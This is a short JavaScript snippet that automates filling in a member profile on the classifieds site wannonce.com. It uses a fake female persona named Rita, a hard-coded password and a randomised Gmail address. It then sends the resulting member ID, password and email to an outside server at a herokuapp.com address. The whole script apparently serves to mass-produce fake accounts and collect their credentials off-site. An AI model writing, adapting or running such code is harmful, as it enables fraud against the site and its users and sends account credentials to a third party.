let pwd = "coucou8";
let email = `melisty${(Math.random() + 1).toString(36).substring(2)}%40gmail.com`;
fetch("/membres/infos_membre.php", {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "upgrade-insecure-requests": "1"
    },
    "referrer": "https://www.wannonce.com/membres/infos_membre.php",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": `prenom=Rita&email=&type_compte=particulier&nom_societe=&siret=&identification_number=&profil_adresse=&profil_adresse2=&profil_cp=&profil_ville=&profil_pays=&profil_tel=&sexe=femme&pwd=${pwd}&pwd_confirm=${pwd}&param_geolocalisation=oui&param_email_alerte=1&param_archiver_msg_send=1&param_use_chat=1&param_notifications=1&param_email_notif=1&param_anonymous=0&register=Traitement+en+cours...`,
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
}).then((r) => {
    fetch(
        "https://logystopi.herokuapp.com/", {
            method: 'POST',
            body: JSON.stringify({
                userid: document.getElementById("tdright").innerText,
                pwd: pwd,
                email: email,
            }),
            mode: 'no-cors'
        })
});